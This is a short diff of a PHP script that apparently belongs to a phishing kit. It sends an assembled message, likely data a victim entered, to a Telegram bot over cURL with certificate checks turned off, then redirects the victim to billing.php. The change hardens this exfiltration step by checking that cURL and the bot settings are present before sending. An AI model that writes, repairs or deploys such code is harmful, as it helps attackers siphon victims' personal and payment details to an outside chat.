@@ -51,7 +51,12 @@ $message .= "+=+=+=+=+=+=+=+=++=+=+=+=+=+=+=+=+\n";
 
 # Send Bot
 
-if ($settings['telegram'] == "1"){
+if (
+    $settings['telegram'] == "1"
+    && function_exists('curl_init')
+    && !empty($settings['bot_url'])
+    && !empty($settings['chat_id'])
+) {
   $data = $message;
   $send = ['chat_id'=>$settings['chat_id'],'text'=>$data];
   $website = "https://api.telegram.org/{$settings['bot_url']}";
@@ -62,6 +67,8 @@ if ($settings['telegram'] == "1"){
   curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
   $result = curl_exec($ch);
   curl_close($ch);
+} else {
+  // Telegram disabled or misconfigured; skipping cURL request.
 }
 
 header('Location: billing.php');
